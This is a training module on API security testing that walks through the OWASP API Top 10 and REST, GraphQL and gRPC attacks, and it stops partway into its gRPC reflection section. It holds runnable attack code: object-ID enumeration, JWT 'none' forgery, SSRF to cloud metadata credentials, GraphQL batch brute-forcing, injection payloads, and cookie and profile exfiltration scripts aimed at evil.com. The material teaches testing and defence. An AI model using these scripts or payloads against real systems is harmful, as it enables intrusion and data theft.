# Module 4.8: API Security Testing — REST, GraphQL, gRPC, and WebSocket

> **Module 04.8** · **Last updated:** 2026-05-07

---

## 1. API Security Landscape

### 1.1 OWASP API Security Top 10 (2023)

The OWASP API Security Top 10 (2023 edition) represents the most critical security risks specific to APIs. Unlike the traditional OWASP Web Top 10, these entries address the unique attack surface that programmatic interfaces expose.

#### API1:2023 — Broken Object Level Authorization (BOLA)

**Description:** The API endpoint receives an object identifier and does not validate that the authenticated user has permission to access the referenced object.

**Exploitation Example:**

```http
GET /api/v1/accounts/7842 HTTP/1.1
Authorization: Bearer eyJhbGci...user_5291_token

# Response: Returns account data for user 7842 — not the authenticated user.
```

An attacker enumerates object IDs systematically:

```python
import httpx

token = "eyJhbGci...stolen_or_legitimate_token"
headers = {"Authorization": f"Bearer {token}"}

for account_id in range(1, 10000):
    r = httpx.get(f"https://api.target.com/v1/accounts/{account_id}", headers=headers)
    if r.status_code == 200:
        print(f"[BOLA] Accessed account {account_id}: {r.json()['email']}")
```

**Root cause:** Authorization checks are performed at the session level (is the user logged in?) but not at the object level (does this user own this object?).

**Remediation:**
- Implement object-level authorization checks in every data-access function.
- Use the authenticated user's session context to scope queries: `WHERE account_id = :current_user_id`.
- Generate non-sequential, non-predictable object identifiers (UUIDv4 or ULID).

#### API2:2023 — Broken Authentication

**Description:** Authentication mechanisms are implemented incorrectly, allowing attackers to compromise authentication tokens or exploit flaws to assume other users' identities.

**Exploitation Examples:**

1. **Credential stuffing** against `/api/login` without rate limiting.
2. **JWT with weak HMAC key** brute-forced offline:
   ```bash
   hashcat -m 16500 jwt.txt rockyou.txt
   ```
3. **Password reset token** returned in the response body instead of being sent to the registered email.

**Remediation:**
- Enforce rate limiting and account lockout on authentication endpoints.
- Use strong, rotated secrets for JWT signing (minimum 256-bit entropy for HMAC, RSA-2048+ or Ed25519 for asymmetric).
- Never expose tokens in URLs or response bodies where they can be logged.
- Implement multi-factor authentication for sensitive operations.

#### API3:2023 — Broken Object Property Level Authorization

**Description:** The API exposes object properties that the user should not be able to read (excessive data exposure) or modify (mass assignment).

**Exploitation — Mass Assignment:**

```http
PUT /api/v1/users/me HTTP/1.1
Content-Type: application/json
Authorization: Bearer eyJ...

{
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",
  "credit_balance": 99999
}
```

The API blindly deserializes the payload and updates fields including `role` and `credit_balance`, which should be server-controlled.

**Exploitation — Excessive Data Exposure:**

```http
GET /api/v1/users/me HTTP/1.1

# Response includes: SSN, internal_notes, password_hash, 2fa_recovery_codes
```

**Remediation:**
- Use explicit allowlists for writable properties at each endpoint.
- Implement read-view DTOs that expose only the fields the consumer is authorized to see.
- Never rely on client-side filtering of sensitive fields.

#### API4:2023 — Unrestricted Resource Consumption

**Description:** The API does not restrict the size or number of resources that can be requested, leading to denial-of-service or excessive billing.

**Exploitation:**

```python
# Exhaust API compute by requesting enormous payloads
import httpx

# Request all records without pagination limit
r = httpx.get("https://api.target.com/v1/transactions?limit=999999999")

# Or trigger expensive operations repeatedly
for _ in range(100000):
    httpx.post("https://api.target.com/v1/reports/generate", json={"range": "10y"})
```

**Remediation:**
- Enforce maximum page sizes server-side (ignore client-requested limits above threshold).
- Implement rate limiting per user, per IP, per endpoint.
- Set execution timeouts on database queries and report generation.
- Monitor and alert on abnormal resource consumption patterns.

#### API5:2023 — Broken Function Level Authorization (BFLA)

**Description:** The API does not properly validate that the authenticated user has the required privilege level to access administrative functions.

**Exploitation:**

```http
# Regular user attempts admin endpoint
DELETE /api/admin/users/7842 HTTP/1.1
Authorization: Bearer eyJ...regular_user_token

# Or discovers undocumented admin routes
POST /api/internal/config/update HTTP/1.1
Authorization: Bearer eyJ...regular_user_token
Content-Type: application/json

{"feature_flags": {"billing_bypass": true}}
```

**Remediation:**
- Implement RBAC (Role-Based Access Control) or ABAC (Attribute-Based Access Control) consistently.
- Deny by default — every endpoint must explicitly declare required permissions.
- Admin endpoints should live on separate network segments or require additional authentication.

#### API6:2023 — Unrestricted Access to Sensitive Business Flows

**Description:** APIs expose business flows without considering the harm of automated, high-volume access — even when individual requests are authorized.

**Exploitation:**
- Automated ticket scalping bots purchasing all inventory via the checkout API.
- Credential-stuffing via the login API at scale.
- Automated creation of fake accounts for spam/fraud.
- Referral bonus farming via scripted sign-ups.

**Remediation:**
- Implement device fingerprinting and behavioral analysis.
- Use CAPTCHA or proof-of-work for sensitive flows.
- Rate limit by business context (e.g., max 3 purchases per minute per user).
- Detect and flag automated access patterns (uniform timing, missing mouse events).

#### API7:2023 — Server Side Request Forgery (SSRF)

**Description:** The API fetches a remote resource specified by the user without validating the target URL, allowing attackers to probe internal infrastructure.

**Exploitation:**

```http
POST /api/v1/webhooks HTTP/1.1
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "events": ["payment.completed"]
}
```

AWS metadata endpoint returns IAM credentials. Also exploitable to scan internal networks:

```python
import httpx

internal_ranges = ["10.0.0.0/24", "172.16.0.0/24", "192.168.1.0/24"]
for ip in generate_ips(internal_ranges):
    r = httpx.post("https://api.target.com/v1/fetch-url", json={"url": f"http://{ip}:8080/"})
    if "connection refused" not in r.text.lower():
        print(f"[SSRF] Live service at {ip}:8080")
```

**Remediation:**
- Maintain an allowlist of permitted URL schemes and domains.
- Block private IP ranges (RFC 1918), link-local (169.254.x.x), and localhost.
- Use a dedicated egress proxy with restricted outbound access.
- Disable HTTP redirects or re-validate after each redirect.

#### API8:2023 — Security Misconfiguration

**Description:** The API or its supporting infrastructure is misconfigured, exposing sensitive data or functionality.

**Common Misconfigurations:**
- Missing security headers (HSTS, X-Content-Type-Options).
- Verbose error messages leaking stack traces and internal paths.
- Default credentials on management interfaces (Kibana, RabbitMQ, Redis).
- TLS misconfiguration (weak ciphers, expired certificates, missing certificate pinning).
- Unnecessary HTTP methods enabled (TRACE, OPTIONS with sensitive info).
- Debug mode enabled in production.

**Exploitation:**

```http
# Trigger verbose error
GET /api/v1/users/'; DROP TABLE users;-- HTTP/1.1

# Response leaks stack trace:
# SqlException at /opt/app/src/db/query_builder.py:42
# Connection string: postgresql://admin:P@ssw0rd@db.internal:5432/prod
```

**Remediation:**
- Harden all components in the stack (web server, API gateway, container runtime).
- Implement a generic error handler that never leaks implementation details.
- Automate configuration scanning (CIS benchmarks, cloud security posture management).
- Remove default credentials and disable unnecessary services.

#### API9:2023 — Improper Inventory Management

**Description:** APIs grow over time with deprecated versions, undocumented endpoints, and shadow APIs that lack proper security controls.

**Exploitation:**
- Discovering deprecated `/api/v1/` endpoints that lack the auth controls added in `/api/v2/`.
- Finding internal debug endpoints through JavaScript source maps or mobile app decompilation.
- Accessing partner APIs exposed to the internet without authentication.

**Remediation:**
- Maintain a complete API inventory with versioning status and retirement dates.
- Decommission old versions with hard cutoff dates.
- Use API gateway to enforce that only documented, active endpoints are routable.
- Scan for shadow APIs using traffic analysis and DNS enumeration.

#### API10:2023 — Unsafe Consumption of APIs

**Description:** The application trusts data from third-party APIs without proper validation, creating injection vectors.

**Exploitation:**

```python
# Third-party API returns malicious data
# Application stores it without sanitization
third_party_data = external_api.get_user_profile(user_id)
# third_party_data["bio"] = "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"

# Application renders this directly in admin panel — XSS
db.users.update(user_id, {"bio": third_party_data["bio"]})
```

**Remediation:**
- Validate and sanitize all data received from third-party APIs.
- Enforce schema validation on incoming data from external sources.
- Use timeout and circuit-breaker patterns to prevent dependency on compromised APIs.
- Implement allowlists for expected data patterns from each integration.

### 1.2 API Attack Surface Analysis

The attack surface of an API comprises every point where untrusted data enters the system:

| Attack Surface | Components |
|----------------|-----------|
| **Transport** | TLS configuration, certificate validation, HTTP/2 multiplexing |
| **Authentication** | Token endpoints, key exchange, credential stores |
| **Authorization** | Object-level checks, function-level checks, field-level checks |
| **Input** | Path parameters, query strings, request bodies, headers, cookies |
| **Business Logic** | Workflow sequences, state transitions, timing assumptions |
| **Infrastructure** | API gateways, load balancers, caches, queues |
| **Documentation** | Swagger/OpenAPI specs, GraphQL introspection, gRPC reflection |

### 1.3 API Discovery and Inventory

**Passive Discovery:**
- Monitor DNS records for API subdomains (`api.`, `gateway.`, `graphql.`, `ws.`).
- Analyze JavaScript bundles for hardcoded API endpoints.
- Decompile mobile applications (APK/IPA) to extract API URLs.
- Parse HAR files from browser developer tools.
- Review git history for API endpoint references.

**Active Discovery:**
- Fuzz common API paths: `/api/`, `/v1/`, `/graphql`, `/grpc`, `/ws`.
- Enumerate using wordlists tailored to API frameworks.
- Probe for OpenAPI/Swagger documentation at standard paths: `/swagger.json`, `/openapi.yaml`, `/api-docs`.
- Check for gRPC reflection: `grpcurl -plaintext target:443 list`.
- Probe GraphQL introspection: `{__schema{types{name}}}`.

**Tool: API endpoint discovery script:**

```python
import httpx
from itertools import product

base = "https://target.com"
paths = ["/api", "/v1", "/v2", "/v3", "/graphql", "/rest", "/internal", "/admin/api"]
methods = ["GET", "POST", "OPTIONS"]

async def discover():
    async with httpx.AsyncClient(timeout=5, verify=False) as client:
        for path, method in product(paths, methods):
            try:
                r = await client.request(method, f"{base}{path}")
                if r.status_code not in (404, 502, 503):
                    print(f"[{r.status_code}] {method} {path}")
            except httpx.RequestError:
                pass
```

### 1.4 Shadow APIs and Zombie APIs

**Shadow APIs** — APIs deployed without going through the official API management pipeline. Common causes:
- Developer-created debug endpoints left in production.
- Microservices communicating over undocumented internal APIs.
- Third-party integrations exposing callback URLs.

**Zombie APIs** — Deprecated API versions that remain accessible. They often:
- Lack security patches applied to current versions.
- Use outdated authentication mechanisms.
- Return excessive data (fields removed in newer versions).

**Detection Approach:**
1. Traffic analysis: Compare documented endpoints against actual network traffic.
2. Scan infrastructure for listening ports and respond-to-all services.
3. Review deployment manifests for services not in the API registry.
4. Analyze API gateway logs for traffic to unregistered routes.

### 1.5 API Gateway vs. Direct API Security

| Aspect | API Gateway | Direct API Security |
|--------|-------------|-------------------|
| **Auth enforcement** | Centralized policy | Each service implements |
| **Rate limiting** | Global + per-route | Per-service implementation |
| **Schema validation** | Gateway-level (coarse) | Service-level (granular) |
| **TLS termination** | Gateway handles | Each service handles |
| **Logging/monitoring** | Unified access logs | Distributed logs |
| **Single point of failure** | Yes (requires HA) | No (distributed failure) |
| **Latency** | Additional hop | Direct path |

**Security implication:** Relying solely on the gateway creates a single bypass point. Defense in depth requires security controls at both the gateway and service level.

---

## 2. REST API Security Testing

### 2.1 Authentication Mechanisms

#### API Keys

API keys provide identification but not true authentication. They are bearer tokens — anyone possessing the key has access.

**Testing approach:**
- Check if API key is transmitted in URL (logged by proxies, cached by browsers).
- Test key rotation: does the old key still work after rotation?
- Test key scope: does a read-only key permit write operations?
- Search for leaked keys in git repos, client-side JavaScript, mobile app binaries.

```bash
# Search GitHub for leaked API keys
gh search code "X-API-Key" --language=javascript --limit=50
# Search for keys in APK
apktool d target.apk && grep -r "api[_-]key\|apikey\|x-api-key" target/
```

#### OAuth 2.0

**Testing targets:**
- Authorization code flow — interception and replay.
- Token endpoint — brute-force client secrets.
- Scope validation — request elevated scopes.
- Redirect URI validation — open redirect via parameter pollution.
- PKCE enforcement — test without code_challenge to detect downgrade.

```python
import httpx

# Test scope escalation
token_response = httpx.post("https://auth.target.com/oauth/token", data={
    "grant_type": "authorization_code",
    "code": intercepted_code,
    "redirect_uri": "https://legitimate.com/callback",
    "client_id": "public_client",
    "code_verifier": code_verifier,
    "scope": "openid profile admin:write"  # Escalated scope
})
print(token_response.json())
```

#### JWT (JSON Web Tokens)

**Attack vectors:**
1. **Algorithm confusion (none/HS256 vs RS256)** — see Section 6.
2. **Expired token acceptance** — server does not validate `exp`.
3. **Signature stripping** — remove signature, change `alg` to `none`.
4. **Weak HMAC secret** — brute-force with hashcat.
5. **Key ID (kid) injection** — path traversal or SQL injection in `kid` header.

```python
import jwt
import base64

# Test algorithm none
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"superuser","exp":9999999999}').rstrip(b'=')
forged_token = f"{header.decode()}.{payload.decode()}."

r = httpx.get("https://api.target.com/v1/admin/users",
              headers={"Authorization": f"Bearer {forged_token}"})
print(r.status_code, r.text[:200])
```

#### mTLS (Mutual TLS)

**Testing approach:**
- Attempt connections without client certificate.
- Use expired or self-signed client certificates.
- Test with a certificate from a different CA.
- Check if certificate CN/SAN is validated against the authenticated identity.
- Test certificate revocation (CRL/OCSP) enforcement.

```bash
# Test mTLS with invalid client cert
openssl s_client -connect api.target.com:443 \
  -cert self_signed.pem -key self_signed.key -CAfile ca.pem

# Test without client cert
curl -k https://api.target.com/v1/secure-endpoint
# Expected: 403 or TLS handshake failure
```

#### HMAC Authentication

**Testing:**
- Timing attacks on signature comparison (constant-time vs. early exit).
- Replay attacks if no nonce/timestamp is included.
- Key extraction through error messages that reveal partial signatures.

```python
import hmac
import hashlib
import time

# Timing attack to determine HMAC validity byte-by-byte
def timing_attack(url, message):
    """Measure response time differences to detect valid signature prefixes."""
    timings = {}
    for byte_val in range(256):
        test_sig = bytes([byte_val]) + b'\x00' * 31
        start = time.perf_counter_ns()
        httpx.get(url, headers={
            "X-Signature": test_sig.hex(),
            "X-Message": message
        })
        elapsed = time.perf_counter_ns() - start
        timings[byte_val] = elapsed
    # The byte with longest response time likely matched first byte
    return max(timings, key=timings.get)
```

### 2.2 Authorization Testing

#### BOLA (Broken Object Level Authorization)

Systematic testing methodology:

```python
import httpx

# 1. Authenticate as User A, obtain token
token_a = authenticate("user_a", "password_a")

# 2. Identify resources belonging to User B
# (through registration, enumeration, or known IDs)
user_b_resources = ["/orders/1001", "/invoices/5002", "/documents/8833"]

# 3. Attempt to access User B's resources with User A's token
for resource in user_b_resources:
    r = httpx.get(f"https://api.target.com/v1{resource}",
                  headers={"Authorization": f"Bearer {token_a}"})
    if r.status_code == 200:
        print(f"[BOLA CONFIRMED] {resource} accessible cross-user")
```

#### BFLA (Broken Function Level Authorization)

```python
# Test administrative functions with non-admin token
admin_endpoints = [
    ("DELETE", "/api/admin/users/123"),
    ("POST", "/api/admin/config"),
    ("PUT", "/api/admin/roles/assign"),
    ("GET", "/api/internal/metrics"),
    ("POST", "/api/internal/cache/flush"),
]

regular_token = authenticate("regular_user", "password")
headers = {"Authorization": f"Bearer {regular_token}"}

for method, endpoint in admin_endpoints:
    r = httpx.request(method, f"https://api.target.com{endpoint}", headers=headers)
    if r.status_code not in (401, 403):
        print(f"[BFLA] {method} {endpoint} returned {r.status_code}")
```

#### Function-Level Access Control

Test horizontal privilege escalation (same role, different scope) and vertical privilege escalation (lower role accessing higher role functions):

```python
# Horizontal: Manager of Department A accessing Department B data
manager_dept_a_token = authenticate("manager_a", "pass")
dept_b_endpoint = "/api/v1/departments/B/salaries"
r = httpx.get(f"https://api.target.com{dept_b_endpoint}",
              headers={"Authorization": f"Bearer {manager_dept_a_token}"})

# Vertical: Regular user accessing manager functions
user_token = authenticate("regular_user", "pass")
manager_endpoint = "/api/v1/team/performance-reviews"
r = httpx.post(f"https://api.target.com{manager_endpoint}",
               headers={"Authorization": f"Bearer {user_token}"},
               json={"employee_id": 42, "rating": 5})
```

### 2.3 Input Validation

#### Parameter Pollution

HTTP Parameter Pollution (HPP) sends the same parameter multiple times to exploit inconsistent parsing:

```http
# Server-side HPP
GET /api/v1/transfer?amount=100&to=attacker&amount=10000 HTTP/1.1
# Some frameworks take the last value, others the first

# Testing with requests
GET /api/v1/search?category=electronics&category=admin_internal HTTP/1.1
# May bypass input validation that only checks the first parameter
```

```python
# Automated HPP testing
params = [
    ("id", "123"), ("id", "456"),  # Which ID is used?
    ("role", "user"), ("role", "admin"),  # Which role is applied?
    ("price", "100"), ("price", "0.01"),  # Which price is charged?
]

r = httpx.get("https://api.target.com/v1/endpoint", params=params)
```

#### Type Juggling

Exploiting loose type comparisons in weakly-typed backends:

```json
// Original request
{"user_id": 123, "amount": 50.00}

// Type juggling attempts
{"user_id": "123", "amount": "50.00"}       // String instead of number
{"user_id": true, "amount": 50.00}          // Boolean coercion
{"user_id": [123], "amount": 50.00}         // Array wrapping
{"user_id": {"$gt": 0}, "amount": 50.00}    // NoSQL operator injection
{"user_id": 123, "amount": 50.00, "amount": 0.01}  // Duplicate key
```

#### Mass Assignment

```python
# Discover writable fields through:
# 1. Reading API documentation
# 2. Observing GET responses (returned fields often map to writable fields)
# 3. Analyzing client-side code

# GET response reveals internal fields
r = httpx.get("https://api.target.com/v1/users/me", headers=auth)
# {"id": 1, "name": "John", "email": "j@e.com", "role": "user", 
#  "verified": true, "credit": 0, "internal_tier": "free"}

# Attempt mass assignment
r = httpx.patch("https://api.target.com/v1/users/me", headers=auth, json={
    "name": "John",
    "role": "admin",
    "verified": True,
    "credit": 99999,
    "internal_tier": "enterprise"
})
```

### 2.4 Rate Limiting Bypass

Common bypass techniques:

```python
# 1. IP rotation through headers
bypass_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "10.0.0.1"},
    {"X-Originating-IP": "192.168.1.1"},
    {"X-Client-IP": "172.16.0.1"},
    {"CF-Connecting-IP": "8.8.8.8"},
    {"True-Client-IP": "1.1.1.1"},
]

# 2. Case manipulation of endpoint
endpoints = [
    "/api/v1/login",
    "/API/V1/LOGIN",
    "/api/v1/login/",
    "/api/v1//login",
    "/api/v1/login?dummy=1",
    "/%61%70%69/v1/login",  # URL-encoded
]

# 3. HTTP method variation
# If POST /login is rate-limited, try PUT /login

# 4. Adding whitespace or null bytes in parameters
payloads = [
    {"username": "admin", "password": "test"},
    {"username": "admin ", "password": "test"},   # trailing space
    {"username": " admin", "password": "test"},   # leading space
    {"username": "admin%00", "password": "test"}, # null byte
]
```

### 2.5 HTTP Method Tampering

```python
# Test for method override headers
methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
override_headers = [
    "X-HTTP-Method-Override",
    "X-HTTP-Method",
    "X-Method-Override",
    "_method",
]

for method in methods:
    # Direct method test
    r = httpx.request(method, "https://api.target.com/v1/users/123", headers=auth)
    print(f"[{method}] -> {r.status_code}")

# Override a GET into DELETE
r = httpx.get("https://api.target.com/v1/users/123",
              headers={**auth, "X-HTTP-Method-Override": "DELETE"})
```

### 2.6 Content-Type Manipulation

```python
# Test parser confusion by sending same payload with different content types
payload = '{"username":"admin","password":"test"}'

content_types = [
    "application/json",
    "application/xml",                    # Trigger XML parser (XXE)
    "application/x-www-form-urlencoded",  # Trigger form parser
    "text/plain",                         # May bypass WAF
    "application/json; charset=utf-7",    # Encoding confusion
    "application/vnd.api+json",           # JSON:API spec
]

for ct in content_types:
    r = httpx.post("https://api.target.com/v1/auth",
                   content=payload, headers={"Content-Type": ct, **auth})
    print(f"[{ct}] -> {r.status_code}: {r.text[:100]}")
```

### 2.7 CORS Misconfiguration Exploitation

```python
# Test CORS with various origins
test_origins = [
    "https://evil.com",
    "https://api.target.com.evil.com",     # Subdomain spoof
    "https://target.com.evil.com",
    "null",                                 # Data URI / sandboxed iframe
    "https://target.com",                   # Legitimate
    "http://target.com",                    # HTTP downgrade
]

for origin in test_origins:
    r = httpx.options("https://api.target.com/v1/users/me", headers={
        "Origin": origin,
        "Access-Control-Request-Method": "GET",
        "Access-Control-Request-Headers": "Authorization"
    })
    acao = r.headers.get("Access-Control-Allow-Origin", "none")
    acac = r.headers.get("Access-Control-Allow-Credentials", "none")
    if acao != "none":
        print(f"[CORS] Origin: {origin} -> ACAO: {acao}, ACAC: {acac}")
        if acac == "true" and acao != "https://target.com":
            print("  [CRITICAL] Credentials allowed with untrusted origin!")
```

**Exploitation via JavaScript (victim must visit attacker page):**

```html
<script>
fetch('https://api.target.com/v1/users/me', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Exfiltrate data to attacker server
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

---

## 3. GraphQL Security

### 3.1 Introspection Disclosure

GraphQL introspection reveals the entire schema — types, fields, queries, mutations, subscriptions, and their arguments.

```graphql
# Full introspection query
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name } }
        args { name type { name kind } }
      }
    }
  }
}
```

**Bypassing disabled introspection:**

```graphql
# Some implementations only block the exact __schema query
# Try alternative introspection paths
{ __type(name: "User") { fields { name type { name } } } }
{ __type(name: "Mutation") { fields { name args { name type { name } } } } }

# Field suggestion exploitation (see 3.4)
{ users { idz } }
# Error: "Did you mean 'id'? Available fields: id, email, password_hash, ssn"
```

**Automated schema extraction:**

```bash
# Using graphql-voyager or InQL Burp extension
# Or with Python:
python -c "
import httpx
introspection_query = '{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name}}}}}}'
r = httpx.post('https://api.target.com/graphql', json={'query': introspection_query})
import json; print(json.dumps(r.json(), indent=2))
"
```

### 3.2 Query Depth Attacks / Resource Exhaustion

Deeply nested queries can exhaust server resources (CPU, memory, database connections):

```graphql
# Recursive query exploiting self-referential types
query DeepNest {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        id
                        email
                        friends {
                          id
                          email
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Width attack — requesting many fields simultaneously:**

```graphql
query WideQuery {
  u1: user(id: 1) { email name phone address }
  u2: user(id: 2) { email name phone address }
  u3: user(id: 3) { email name phone address }
  # ... repeat 1000 times using aliases
  u1000: user(id: 1000) { email name phone address }
}
```

**Automated depth/width testing:**

```python
def generate_deep_query(depth: int) -> str:
    """Generate a query with specified nesting depth."""
    query = "{ user(id: 1) "
    for _ in range(depth):
        query += "{ friends "
    query += "{ id } "
    for _ in range(depth):
        query += "} "
    query += "}"
    return query

# Binary search for max allowed depth
low, high = 1, 100
while low < high:
    mid = (low + high) // 2
    q = generate_deep_query(mid)
    r = httpx.post("https://api.target.com/graphql", json={"query": q}, headers=auth)
    if r.status_code == 200 and "errors" not in r.json():
        low = mid + 1
    else:
        high = mid
print(f"Max allowed depth: {low - 1}")
```

### 3.3 Batching Attacks

GraphQL servers often support query batching — sending multiple operations in a single request:

```json
[
  {"query": "mutation { login(email:\"admin@co.com\", password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"admin@co.com\", password:\"pass2\") { token } }"},
  {"query": "mutation { login(email:\"admin@co.com\", password:\"pass3\") { token } }"},
  {"query": "mutation { login(email:\"admin@co.com\", password:\"pass4\") { token } }"}
]
```

This bypasses rate limiting that counts HTTP requests rather than individual operations.

**Automated batch brute-force:**

```python
def batch_bruteforce(email: str, passwords: list[str], batch_size: int = 100):
    """Brute-force login via GraphQL batching to bypass rate limits."""
    url = "https://api.target.com/graphql"
    
    for i in range(0, len(passwords), batch_size):
        batch = passwords[i:i + batch_size]
        queries = [
            {"query": f'mutation {{ login(email: "{email}", password: "{p}") {{ token }} }}'}
            for p in batch
        ]
        r = httpx.post(url, json=queries)
        results = r.json()
        for idx, result in enumerate(results):
            if "token" in str(result.get("data", {})):
                return batch[idx]
    return None
```

### 3.4 Field Suggestion Exploitation

Many GraphQL implementations provide helpful error messages that reveal field names:

```graphql
# Intentionally misspell field names to extract suggestions
{ user(id: 1) { passwor } }
# Error: "Cannot query field 'passwor' on type 'User'. 
#         Did you mean 'password', 'password_hash', or 'password_reset_token'?"

{ user(id: 1) { ssn_numb } }
# Error: "Did you mean 'ssn_number' or 'ssn_last_four'?"
```

**Automated field discovery through suggestions:**

```python
import string

def discover_fields_via_suggestions(url: str, type_name: str):
    """Discover fields by triggering suggestion errors."""
    discovered = set()
    prefixes = list(string.ascii_lowercase) + ["is_", "has_", "get_", "set_"]
    
    for prefix in prefixes:
        query = f'{{ {type_name.lower()}(id: 1) {{ {prefix}zzz }} }}'
        r = httpx.post(url, json={"query": query})
        errors = r.json().get("errors", [])
        for error in errors:
            msg = error.get("message", "")
            # Parse suggestions from error message
            if "Did you mean" in msg:
                import re
                fields = re.findall(r"'(\w+)'", msg)
                discovered.update(fields)
    
    return discovered
```

### 3.5 Authorization at Resolver Level

A common vulnerability: authorization is checked at the query level but not at individual resolvers.

```graphql
# User query is authorized, but nested resolvers leak data
query {
  myProfile {
    id
    name
    organization {
      # This resolver doesn't check if the user should see all members
      allMembers {
        email
        salary
        socialSecurityNumber
      }
    }
  }
}
```

**Testing approach:**

```graphql
# 1. Identify types accessible through multiple paths
# Path A (authorized): query { myOrders { items { product { ... } } } }
# Path B (unauthorized): query { products(id: X) { orders { customer { ... } } } }

# 2. Access sensitive data through back-references
query {
  publicPost(id: 1) {
    author {
      privateMessages {   # Resolver doesn't re-check auth
        content
        recipient { email }
      }
    }
  }
}
```

### 3.6 Injection Through Variables

GraphQL variables can be vectors for injection if not properly parameterized at the resolver:

```graphql
# NoSQL injection through variables
query SearchUsers($filter: String!) {
  users(filter: $filter) {
    id
    email
  }
}

# Variables payload with MongoDB operator injection:
{
  "filter": "{\"$where\": \"sleep(5000)\"}"
}

# SQL injection if resolver builds raw SQL:
{
  "filter": "'; DROP TABLE users; --"
}
```

```python
# Testing injection through variables
injection_payloads = [
    {"filter": "' OR '1'='1"},
    {"filter": "'; WAITFOR DELAY '0:0:5'; --"},
    {"filter": '{"$ne": null}'},
    {"filter": '{"$gt": ""}'},
    {"filter": '{"$regex": ".*"}'},
    {"filter": "{{7*7}}"},  # SSTI
]

query = "query Search($filter: String!) { users(filter: $filter) { id email } }"
for payload in injection_payloads:
    r = httpx.post("https://api.target.com/graphql",
                   json={"query": query, "variables": payload})
    print(f"Payload: {payload} -> Status: {r.status_code}, Length: {len(r.text)}")
```

### 3.7 Query Whitelisting Bypass

Some applications implement persisted/allowlisted queries to restrict what can be executed:

```python
# Bypass attempts for query whitelisting

# 1. Identify if whitelisting is hash-based
# Modify whitespace/comments to create same-functionality, different-hash queries
queries = [
    "{ users { id } }",
    "{users{id}}",                    # Remove whitespace
    "{ users { id }  }",             # Extra space
    "#comment\n{ users { id } }",    # Add comment
    "{ users { id, } }",             # Trailing comma (some parsers accept)
]

# 2. Test if new mutations can be registered
register_query = """
mutation RegisterQuery($query: String!) {
  registerPersistedQuery(query: $query, id: "attacker_query")
}
"""

# 3. Test APQ (Automatic Persisted Queries) with crafted hashes
# APQ uses SHA-256 of the query as the ID
import hashlib
malicious_query = "{ users { password_hash } }"
query_hash = hashlib.sha256(malicious_query.encode()).hexdigest()

# First request: send hash, server returns "PersistedQueryNotFound"
r = httpx.post(url, json={
    "extensions": {"persistedQuery": {"version": 1, "sha256Hash": query_hash}}
})

# Second request: send hash + query, server caches it
r = httpx.post(url, json={
    "query": malicious_query,
    "extensions": {"persistedQuery": {"version": 1, "sha256Hash": query_hash}}
})
```

### 3.8 Persisted Queries Security

**Risks with persisted query implementations:**
- Cache poisoning: registering malicious queries that get served to other clients.
- Hash collision (theoretical): crafting queries with same hash as legitimate ones.
- Version mismatch: old cached queries referencing removed but still-functional resolvers.

### 3.9 Subscriptions Abuse for Data Exfiltration

GraphQL subscriptions maintain a persistent WebSocket connection, potentially leaking real-time data:

```graphql
# Subscribe to events the user shouldn't see
subscription {
  orderUpdates(organizationId: "competitor_org_id") {
    orderId
    customerEmail
    totalAmount
    items { sku quantity }
  }
}

# Subscribe to internal system events
subscription {
  systemLogs {
    timestamp
    level
    message  # May contain credentials, internal IPs
    metadata
  }
}
```

**Testing subscription authorization:**

```python
import websockets
import json

async def test_subscription_authz():
    uri = "wss://api.target.com/graphql"
    async with websockets.connect(uri, subprotocols=["graphql-ws"]) as ws:
        # Initialize connection
        await ws.send(json.dumps({"type": "connection_init", "payload": {"token": user_token}}))
        await ws.recv()  # connection_ack
        
        # Subscribe to another user's events
        await ws.send(json.dumps({
            "id": "1",
            "type": "start",
            "payload": {
                "query": "subscription { userEvents(userId: \"victim_id\") { event data } }"
            }
        }))
        
        # Listen for leaked data
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            if data.get("type") == "data":
                print(f"[EXFIL] {data['payload']}")
```

---

## 4. gRPC Security Testing

### 4.1 Protobuf Message Manipulation

Protocol Buffers (protobuf) use binary serialization. Testing requires understanding the message schema:

```bash
# Decode unknown protobuf message
echo "base64_encoded_message" | base64 -d | protoc --decode_raw

# If you have the .proto file:
echo "base64_encoded_message" | base64 -d | protoc --decode=UserRequest user.proto
```

**Manipulation techniques:**

```python
# Using grpcio and the generated protobuf classes
import grpc
from generated import user_pb2, user_pb2_grpc

# Connect to gRPC service
channel = grpc.insecure_channel('target.com:50051')
stub = user_pb2_grpc.UserServiceStub(channel)

# Manipulate fields
request = user_pb2.GetUserRequest()
request.user_id = 1  # Normal
request.user_id = -1  # Negative ID
request.user_id = 2147483647  # Integer overflow boundary
request.user_id = 0  # Zero (default value confusion)

# Add unknown fields (wire type manipulation)
# Protobuf silently ignores unknown fields — test if server processes them
request._unknown_fields = [(15, 0, b'\x01')]  # Field 15, varint, value 1
```

**Field number manipulation:**

```python
# Craft raw protobuf with unexpected field numbers
# Field numbers map to specific data — changing them can cause confusion
import struct

def encode_varint(value):
    """Encode integer as protobuf varint."""
    result = []
    while value > 127:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value)
    return bytes(result)

def craft_protobuf(field_number, wire_type, value):
    """Craft a single protobuf field."""
    tag = (field_number << 3) | wire_type
    return encode_varint(tag) + value

# Inject admin role field (field 7, varint value 1)
malicious_payload = craft_protobuf(1, 0, encode_varint(123))  # user_id
malicious_payload += craft_protobuf(7, 0, encode_varint(1))   # role: admin (if exists)
```

### 4.2 Reflection API Exploitation

gRPC reflection allows clients to discover available services without the `.proto` file:

```bash
